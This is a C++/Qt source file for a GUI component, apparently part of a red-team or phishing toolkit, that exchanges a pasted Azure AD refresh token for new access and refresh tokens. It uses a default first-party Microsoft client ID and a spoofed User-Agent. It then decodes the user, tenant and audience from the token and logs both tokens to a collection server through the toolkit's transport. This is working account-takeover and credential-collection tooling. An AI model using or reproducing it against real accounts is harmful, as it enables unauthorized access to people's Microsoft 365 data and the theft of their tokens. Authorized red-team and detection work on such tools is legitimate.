#include "RequestRefreshTokens.h"
#include "NetworkHelper.h"
#include "../shared/Protocol.h"
#include <QUrlQuery>
#include <QNetworkRequest>
#include <QJsonValueRef>
#include <QUuid>
#include <QApplication>

RequestRefreshTokens::RequestRefreshTokens(QWidget *parent)
    : QWidget(parent), net(new QNetworkAccessManager(this)) {

    setWindowTitle("Request Access Token via Refresh Token");
    resize(500, 450);

    auto *layout = new QVBoxLayout(this);

    layout->addWidget(new QLabel("Refresh Token"));
    refreshInput = new QTextEdit();
    refreshInput->setPlaceholderText("Paste your refresh token");
    refreshInput->setFixedHeight(80);
    layout->addWidget(refreshInput);

    layout->addWidget(new QLabel("Domain (e.g. init1security.com)"));
    domainInput = new QLineEdit();
    domainInput->setPlaceholderText("AAD verified domain name");
    layout->addWidget(domainInput);

    layout->addWidget(new QLabel("Resource URL (e.g. https://graph.microsoft.com)"));
    resourceInput = new QLineEdit();
    resourceInput->setPlaceholderText("https://graph.microsoft.com");
    layout->addWidget(resourceInput);

    layout->addWidget(new QLabel("User-Agent"));
    userAgentInput = new QLineEdit();
    userAgentInput->setText("Azure/1.0"); // Default
    layout->addWidget(userAgentInput);

    layout->addWidget(new QLabel("Client ID"));
    clientIdInput = new QLineEdit();
    clientIdInput->setText("d3590ed6-52b3-4102-aeff-aad2292ab01c"); // Default
    layout->addWidget(clientIdInput);

    fetchBtn = new QPushButton("Get Access Token");
    layout->addWidget(fetchBtn);
    connect(fetchBtn, &QPushButton::clicked, this, &RequestRefreshTokens::handleRequest);

    resultOutput = new QTextEdit();
    resultOutput->setReadOnly(true);
    layout->addWidget(resultOutput);

    setLayout(layout);
}

void RequestRefreshTokens::handleRequest() {
    refreshToken = refreshInput->toPlainText().trimmed();
    domain = domainInput->text().trimmed();
    resource = resourceInput->text().trimmed();
    clientId = clientIdInput->text().trimmed();
    userAgent = userAgentInput->text().trimmed();

    if (refreshToken.isEmpty() || domain.isEmpty() || resource.isEmpty() || clientId.isEmpty() || userAgent.isEmpty()) {
        QMessageBox::warning(this, "Missing Fields", "Please fill in all fields.");
        return;
    }

    // Disable button during async operation
    fetchBtn->setEnabled(false);
    fetchBtn->setText("Fetching...");
    resultOutput->clear();

    // 1. Discover Tenant ID from Domain
    QString openidUrl = QString("https://login.microsoftonline.com/%1/.well-known/openid-configuration").arg(domain);
    QNetworkRequest req{ QUrl(openidUrl) };
    req.setRawHeader("User-Agent", userAgent.toUtf8());
    NetworkHelper::setRequestTimeout(req);

    QNetworkReply *rep = net->get(req);
    if (!rep) {
        resultOutput->setPlainText("[!] Failed to create network request");
        fetchBtn->setEnabled(true);
        fetchBtn->setText("Get Access Token");
        return;
    }
    connect(rep, &QNetworkReply::finished, this, &RequestRefreshTokens::handleOpenIdReply);
}

void RequestRefreshTokens::handleOpenIdReply() {
    QNetworkReply *rep = qobject_cast<QNetworkReply *>(sender());
    if (!rep) return;

    if (rep->error() != QNetworkReply::NoError) {
        resultOutput->setPlainText(QString("[!] Error discovering OpenID config: %1").arg(rep->errorString()));
        fetchBtn->setEnabled(true);
        fetchBtn->setText("Get Access Token");
        rep->deleteLater();
        return;
    }

    const QJsonObject obj = QJsonDocument::fromJson(rep->readAll()).object();
    rep->deleteLater();

    QString authUrl = obj.value("authorization_endpoint").toString();
    if (authUrl.isEmpty()) {
        resultOutput->setPlainText("[!] Could not parse authorization endpoint.");
        fetchBtn->setEnabled(true);
        fetchBtn->setText("Get Access Token");
        return;
    }

    QStringList parts = authUrl.split('/');
    if (parts.size() < 4) {
        resultOutput->setPlainText("[!] Invalid authorization endpoint format.");
        fetchBtn->setEnabled(true);
        fetchBtn->setText("Get Access Token");
        return;
    }

    QString tenantId = parts.at(3);

    // 2. Prepare refresh token request
    QString tokenUrl = QString("https://login.microsoftonline.com/%1/oauth2/token?api-version=1.0").arg(tenantId);

    QUrlQuery query;
    query.addQueryItem("grant_type", "refresh_token");
    query.addQueryItem("refresh_token", refreshToken);
    query.addQueryItem("client_id", clientId);
    query.addQueryItem("resource", resource);
    query.addQueryItem("scope", "openid");

    QNetworkRequest req{ QUrl(tokenUrl) };
    req.setRawHeader("User-Agent", userAgent.toUtf8());
    req.setHeader(QNetworkRequest::ContentTypeHeader, "application/x-www-form-urlencoded");
    NetworkHelper::setRequestTimeout(req);

    // Send POST
    QNetworkReply *tokRep = net->post(req, query.toString(QUrl::FullyEncoded).toUtf8());
    if (!tokRep) {
        resultOutput->setPlainText("[!] Failed to create token request");
        fetchBtn->setEnabled(true);
        fetchBtn->setText("Get Access Token");
        return;
    }
    connect(tokRep, &QNetworkReply::finished, this, &RequestRefreshTokens::handleTokenReply);
}

void RequestRefreshTokens::handleTokenReply() {
    QNetworkReply *rep = qobject_cast<QNetworkReply *>(sender());
    if (!rep) return;

    // Re-enable button
    fetchBtn->setEnabled(true);
    fetchBtn->setText("Get Access Token");

    if (rep->error() != QNetworkReply::NoError) {
        resultOutput->setPlainText(QString("[!] Error fetching token: %1").arg(rep->errorString()));
        rep->deleteLater();
        return;
    }

    const QJsonObject obj = QJsonDocument::fromJson(rep->readAll()).object();
    rep->deleteLater();

    QString accessToken = obj.value("access_token").toString();
    QString newRefreshToken = obj.value("refresh_token").toString();
    QString scope = obj.value("scope").toString();

    QString output;
    output += QString("[Scope]\n%1\n\n").arg(scope.isEmpty() ? "N/A" : scope);
    output += QString("[AccessToken]\n%1\n\n").arg(accessToken.isEmpty() ? "N/A" : accessToken);
    output += QString("[RefreshToken]\n%1\n").arg(newRefreshToken.isEmpty() ? "N/A" : newRefreshToken);

    resultOutput->setPlainText(output);

    // Log token to server database
    logTokenToServer(accessToken, newRefreshToken);
}

void RequestRefreshTokens::logTokenToServer(const QString &accessToken, const QString &refreshToken) {
    if (accessToken.isEmpty()) {
        return; // Nothing to log
    }

    QObject *transportObj = locateTransport();
    if (!transportObj) {
        qWarning() << "[RequestRefreshTokens] Cannot log token: no transport found";
        return;
    }

    // Generate a unique session ID for refresh token exchange
    QString sessionId = QString("refresh_token_%1").arg(QUuid::createUuid().toString(QUuid::WithoutBraces));

    // Extract claims from JWT for proper logging
    QString upn = b64UrlDecodeToJsonField(accessToken, "upn");
    if (upn.isEmpty()) {
        upn = b64UrlDecodeToJsonField(accessToken, "preferred_username");
    }
    if (upn.isEmpty()) {
        upn = b64UrlDecodeToJsonField(accessToken, "unique_name");
    }
    QString tenantId = b64UrlDecodeToJsonField(accessToken, "tid");
    QString resourceVal = b64UrlDecodeToJsonField(accessToken, "aud");

    // Use configured resource if available
    if (!resource.isEmpty()) {
        resourceVal = resource;
    }

    QJsonObject req;
    req.insert(Protocol::F_ACTION, Protocol::ACTION_LOG_TOKEN);
    req.insert("sessionId", sessionId);
    req.insert("source", "refresh_token_exchange");
    req.insert("accessToken", accessToken);
    if (!refreshToken.isEmpty())
        req.insert("refreshToken", refreshToken);
    if (!upn.isEmpty())
        req.insert("user", upn);
    if (!tenantId.isEmpty())
        req.insert("tenantId", tenantId);
    if (!resourceVal.isEmpty())
        req.insert("resource", resourceVal);

    // Send to server
    QMetaObject::invokeMethod(transportObj, "sendJson", Q_ARG(QJsonObject, req));

    qInfo() << "[RequestRefreshTokens] Token logged to server | User:" << upn << "| Tenant:" << tenantId;
}

QString RequestRefreshTokens::b64UrlDecodeToJsonField(const QString &jwtToken, const QString &field) {
    const QStringList parts = jwtToken.split('.');
    if (parts.size() < 2) return QString();

    QByteArray payload = parts.at(1).toUtf8();
    int pad = (4 - (payload.size() % 4)) % 4;
    payload.append(QByteArray(pad, '='));

    QByteArray decoded = QByteArray::fromBase64(payload, QByteArray::Base64UrlEncoding);
    if (decoded.isEmpty()) return QString();

    QJsonParseError parseError;
    QJsonDocument doc = QJsonDocument::fromJson(decoded, &parseError);
    if (parseError.error != QJsonParseError::NoError || !doc.isObject()) return QString();

    return doc.object().value(field).toString();
}

QObject* RequestRefreshTokens::locateTransport() {
    // Try to find ClientTransport in the application
    QObject *found = qApp->findChild<QObject*>("ClientTransport", Qt::FindChildrenRecursively);
    if (!found) {
        // Brute-force scan for ClientTransport
        const auto objs = qApp->findChildren<QObject*>();
        for (QObject* o : objs) {
            const char* cn = o->metaObject() ? o->metaObject()->className() : nullptr;
            if (cn && QByteArray(cn).contains("ClientTransport")) {
                found = o;
                break;
            }
        }
    }
    return found;
}
